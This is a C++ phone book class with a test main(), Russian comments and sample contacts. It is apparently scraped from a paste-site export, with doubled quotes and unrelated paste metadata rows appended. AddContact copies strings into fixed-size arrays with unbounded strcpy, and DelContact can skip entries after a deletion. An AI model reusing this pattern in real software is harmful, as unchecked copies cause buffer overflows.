using namespace std;

struct contact {
	char name[100];
	char mobile_phone[20];
	char home_phone[20];
	char work_phone[20];
};

class phone_book {

public:

	phone_book() : store(new contact* [100]), contacts_number(0), max_contacts_number(100) {}

	phone_book(int max_number) : store(new contact* [max_number]), contacts_number(0), max_contacts_number(max_number) {}

	phone_book(contact arr[], int arr_size) : store(new contact* [100]), contacts_number(0), max_contacts_number(100) {
		for (int i = 0; i < arr_size; i++) {
			AddContact(arr[i].name, arr[i].mobile_phone, arr[i].home_phone, arr[i].work_phone);
		}
	}

	phone_book(const phone_book& other) : store(new contact* [other.max_contacts_number]), contacts_number(0), max_contacts_number(other.max_contacts_number) {
		for (int i = 0; i < other.contacts_number; i++) {
			AddContact(other.store[i]->name, other.store[i]->mobile_phone, other.store[i]->home_phone, other.store[i]->work_phone);
		}
	}

	phone_book& operator=(const phone_book& other) {
		if (this != &other) {
			for (int i = 0; i < contacts_number; i++) {
				delete store[i];
			}
			delete[] store;
			contacts_number = 0;
			max_contacts_number = other.max_contacts_number;
			store = new contact * [max_contacts_number];
			for (int i = 0; i < other.contacts_number; i++) {
				AddContact(other.store[i]->name, other.store[i]->mobile_phone, other.store[i]->home_phone, other.store[i]->work_phone);
			}
		}
		return *this;
	}

	friend ostream& operator<<(ostream& output, const phone_book& book);

	bool operator==(const phone_book& other) {
		if (this->contacts_number != other.contacts_number) {
			return false;
		}
		for (int i = 0; i < contacts_number; i++) {
			if (strcmp(other.store[i]->name, store[i]->name) || strcmp(other.store[i]->mobile_phone, store[i]->mobile_phone) || strcmp(other.store[i]->home_phone, store[i]->home_phone) || strcmp(other.store[i]->work_phone, store[i]->work_phone)) {
				return false;
			}
		}
		return true;
	}

	bool operator!=(const phone_book& other) {
		return !(*this == other);
	}

	void AddContact(const char name[], const char mobile_phone[], const char home_phone[], const char work_phone[]) { // не забывать ставить const, иначе не скомпилируется
		if (contacts_number == max_contacts_number) {
			cout << ""The contact cannot be added"" << endl;
			return;
		}
		store[contacts_number] = new contact{};
		strcpy(store[contacts_number]->name, name);
		strcpy(store[contacts_number]->mobile_phone, mobile_phone);
		strcpy(store[contacts_number]->home_phone, home_phone);
		strcpy(store[contacts_number]->work_phone, work_phone);
		contacts_number++;
	}

	void DelContact(const char name[]) {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i]->name, name)) { // возвращает 0 если строки одинаковые, поэтому используем ! (чтобы возврат нуля означал ""истину"")
				delete store[i];
				for (int j = i; j < contacts_number - 1; j++) {
					store[j] = store[j + 1];
				}
				store[contacts_number - 1] = nullptr;
				contacts_number--;
			}
		}
	}

	void FindContactName(const char name[]) {
		cout << ""Found according to your request: "" << endl;
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i]->name, name)) {
				cout << '\""' << store[i]->name << ""\"", mobile_phone: "" << store[i]->mobile_phone << "", home_phone: "" << store[i]->home_phone << "", work_phone: "" << store[i]->work_phone << endl;
			}
		}
		cout << endl;
	}

	~phone_book() {
		for (int i = 0; i < contacts_number; i++) {
			delete store[i];
		}
		delete[] store;
	}

private:
	contact** store;
	int contacts_number;
	int max_contacts_number;

};

ostream& operator<<(ostream& output, const phone_book& book) {
	output << ""The following contacts are available: "" << endl;
	if (book.contacts_number == 0) {
		output << ""No contacts"";
	}
	for (int i = 0; i < book.contacts_number; ++i) {
		output << '\""' << book.store[i]->name << ""\"", mobile_phone: "" << book.store[i]->mobile_phone << "", home_phone: "" << book.store[i]->home_phone << "", work_phone: "" << book.store[i]->work_phone << endl;
	}
	output << endl;
	return output;
}


int main() { // для проверки функционала

	phone_book my_store; // для проверки конструктора по умолчанию

	//phone_book my_store(50); // для проверки конструктора для одного параметра

	//contact some_contacts[]{ {""Ivan"", ""+79111111111"", ""111111"", ""121212""}, {""Zhenya"", ""+79111111333"", ""111133"", ""121233""}}; // для проверки конструктора для двух параметров (закомментировать первые два добавления контакта)

	//phone_book my_store(some_contacts, 2); // для проверки конструктора для двух параметров

	my_store.AddContact(""Ivan"", ""+79111111111"", ""111111"", ""121212"");
	my_store.AddContact(""Zhenya"", ""+79111111333"", ""111133"", ""121233"");
	my_store.AddContact(""Galya"", ""+79115511333"", ""166133"", ""127733"");
	my_store.AddContact(""Olya"", ""+79115511333"", ""166133"", ""127733"");

	cout << my_store;

	my_store.DelContact(""Zhenya"");

	cout << my_store;

	my_store.AddContact(""Zhenya"", ""+79111111333"", ""111133"", ""121233"");

	my_store.FindContactName(""Galya"");

	cout << ""my_store: "" << endl;

	cout << my_store;

	phone_book my_store2(my_store);

	cout << ""my_store2: "" << endl;

	cout << my_store2;

	phone_book my_store3;

	my_store3 = my_store2;

	cout << ""my_store3: "" << endl;

	cout << my_store3;

	cout << boolalpha;

	cout << (my_store == my_store2) << endl;

	cout << (my_store != my_store2) << endl;

}
"
a3mTgfR9,Untitled,wheresTheAnyKey,Bash,Wednesday 7th of June 2023 03:25:53 AM CDT,"www.qatesting.io
"
juNkrm3p,Untitled,wheresTheAnyKey,Bash,Wednesday 7th of June 2023 03:25:48 AM CDT,"www.qatesting.cn
"
qSTwqXfr,Untitled,wheresTheAnyKey,Bash,Wednesday 7th of June 2023 03:25:43 AM CDT,"www.qatesting.co.uk
"
uvGH1AL1,Untitled,wheresTheAnyKey,Bash,Wednesday 7th of June 2023 03:25:37 AM CDT,"www.qatesting
"
